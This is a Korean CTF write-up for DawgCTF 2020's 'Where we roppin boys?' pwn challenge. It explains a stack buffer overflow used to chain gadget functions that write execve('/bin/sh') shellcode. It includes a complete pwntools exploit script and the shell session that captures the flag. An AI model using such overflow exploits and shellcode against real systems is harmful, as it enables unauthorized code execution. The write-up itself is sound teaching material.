# [WriteUp]DawgCTF 2020 - Where we roppin boys?

:black_nib:N1be(sj.dr.nibe@gmail.com)

---

## Overview

### welcome()

```c
int (*welcome())(void)
{
  int (*result)(void); // eax

  puts("What's up guys welcome to my channel today we're gonna hack fornite XD");
  puts("So where we roppin boys?");
  shellcode = (int (*)(void))mmap(0, 0x1Cu, 3, 34, -1, 0);
  result = shellcode;
  if ( shellcode == (int (*)(void))-1 )
  {
    perror("mmap() failed");
    exit(1);
  }
  return result;
}
```

`welcome()`에서는 `mmap()`으로 영역을 할당하는데, 쉘코드가 들어갈 영역인 것 같다.

### tryme()

```c
int tryme()
{
  char s[8]; // [esp+Ch] [ebp-Ch]

  fgets(s, 25, stdin);
  fflush(stdin);
  return 0;
}
```

`tryme()`에서는 `fgets()`로 문자열을 입력받는데, `s`의 시작 주소가 `ebp-0xc`이고 입력은 `0x19`바이트만큼 받기 때문에 return address와 그 뒤의 4바이트를 원하는 값으로 덮을 수 있다.

바이너리에는 ROP의 퍼즐 조각인 7개의 함수들과 `win()`이라는 함수가 있다. 한 예시로 `loot_lake()`는 다음과 같이 생겼다.

```c
int loot_lake()
{
  int v0; // edx
  int v1; // edx
  int v2; // edx
  int v3; // edx

  if ( len > 23 )
    return 1;
  v0 = len++;
  *((_BYTE *)shellcode + v0) = 0xC0;
  v1 = len++;
  *((_BYTE *)shellcode + v1) = 0x40;
  v2 = len++;
  *((_BYTE *)shellcode + v2) = 0xCD;
  v3 = len++;
  *((_BYTE *)shellcode + v3) = 0x80;
  return 0;
}
```

나머지 6개의 함수들도 똑같이 생겼고 숫자만 다르다. 함수를 호출하면 `welcome()`에서 할당된 `shellcode` 영역에 4바이트의 값을 쓴다. 값을 저장할 때마다 `len`을 늘리고 `len`이 23보다 크면 더 이상 입력하지 않는다. 초기에 `len`은 0이고, 후위 연산자를 이용해서 값을 증가시키기 때문에 `shellcode`에 24바이트까지는 입력할 수 있다.

### Mitigation

```shell
gdb-peda$ checksec
CANARY    : disabled
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : Partial
```

보호기법을 확인해 보면 PIE가 꺼져 있다. 함수들의 주소를 그대로 가져다 써도 된다. canary도 BOF를 위해서 당연히 없다.

---

## Exploit plan

`loot_lake()`의 주소와 `tryme()`의 주소로 ROP chain을 구성하여 `tryme()`의 return address를 덮으면, `loot_lake()`이 `shellcode`에 4바이트를 적은 뒤 다시 `tryme()`가 실행될 것이다. 결과적으로 `shellcode`의 길이가 24가 될 때까지 자유롭게 함수들을 호출하며 값을 적을 수 있다. 함수들의 순서를 적절히 조절하여 쉘을 획득할 수 있는 코드가 되도록 만들어야 한다. 이건 퍼즐을 요리조리 맞춰 보면 되는데, 뭐라 설명할 길이 없다. 그냥 하면 된다. 도움이 되는 사실은 `cd 80`이 `int 0x80`을 뜻한다는 것과, `68`이 `push`를 뜻한다는 것 정도가 있겠다.

결론적으로, 다음의 순서대로 호출하면 쉘코드가 완성된다.

`tilted_towers()` - `junk_junction()` - `snobby_shores()` - `greasy_grove()` - `lonely_lodge()` - `dusty_depot()`

```shell
   0xf7f89000:	xor    eax,eax
   0xf7f89002:	push   eax
   0xf7f89003:	push   0x68732f2f
   0xf7f89008:	push   0x6e69622f
   0xf7f8900d:	mov    ebx,esp
   0xf7f8900f:	mov    ecx,eax
   0xf7f89011:	mov    edx,eax
   0xf7f89013:	mov    al,0xb
   0xf7f89015:	int    0x80
```

나머지 하나 `loot_lake()`는 뒤에 붙이면 `exit()`까지 호출하는 쉘코드가 되는데, 최대 24바이트까지밖에 못 쓰니 버리자. 쉘을 획득하는 데에는 지장이 없다.

```python
# exploit_rop.py

from pwn import *

# r = process("./rop")
r = remote("ctf.umbccd.io", 4100)

loot_lake = 0x8049248 # address of loot_lake()
lonely_lodge = 0x80492e2 # address of lonely_lodge()
tilted_towers = 0x804937c # address of tilted_towers()
snobby_shores = 0x8049416 # address of snobby_shores()
dusty_depot = 0x80494b0 # address of dusty_depot()
junk_junction = 0x804954a # address of junk_junction()
greasy_grove = 0x80495e4 # address of greasy_grove()
win = 0x804967e # address of win()
tryme = 0x80496ca # address of tryme()

r.recvuntil("So where we roppin boys?\n")

dummy = "A" * 0x10

payload = dummy + p32(tilted_towers) + p32(tryme)
r.send(payload)

payload = dummy + p32(junk_junction) + p32(tryme)
r.send(payload)

payload = dummy + p32(snobby_shores) + p32(tryme)
r.send(payload)

payload = dummy + p32(greasy_grove) + p32(tryme)
r.send(payload)

payload = dummy + p32(lonely_lodge) + p32(tryme)
r.send(payload)

payload = dummy + p32(dusty_depot) + p32(tryme)
r.send(payload)

payload = dummy + p32(win)
r.sendline(payload)

r.interactive()
```

```shell
dr-nibe@ubuntu:~/DawgCTF2020$ python exploit_rop.py
[+] Opening connection to ctf.umbccd.io on port 4100: Done
[*] Switching to interactive mode
sh: 0: can't access tty; job control turned off
$ $ whoami
challuser
$ $ ls
flag.txt  rop
$ $ cat flag.txt
DawgCTF{f0rtni9ht_xD}
$ $  
```
